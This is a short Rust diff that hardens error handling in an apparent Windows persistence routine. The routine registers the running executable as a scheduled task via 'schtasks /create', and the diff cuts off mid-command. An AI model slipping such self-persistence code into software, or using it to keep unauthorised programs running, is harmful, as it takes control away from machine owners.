@@ -24,10 +24,17 @@ pub fn uninstall_persistence() -> String {
 
 #[cfg(windows)]
 fn install_windows_persistence() -> String {
-    let exe = std::env::current_exe().unwrap();
+    let exe = match std::env::current_exe() {
+        Ok(exe) => exe,
+        Err(e) => return format!("Error: {}", e),
+    };
     let username = whoami::username();
 
-    let quoted_tr = format!("\"{}\"", exe.to_str().unwrap());
+    let exe_str = match exe.to_str() {
+        Some(path) => path,
+        None => return "Error: Invalid executable path".to_string(),
+    };
+    let quoted_tr = format!("\"{}\"", exe_str);
     let result = Command::new("schtasks")
         .args(&[
             "/create",
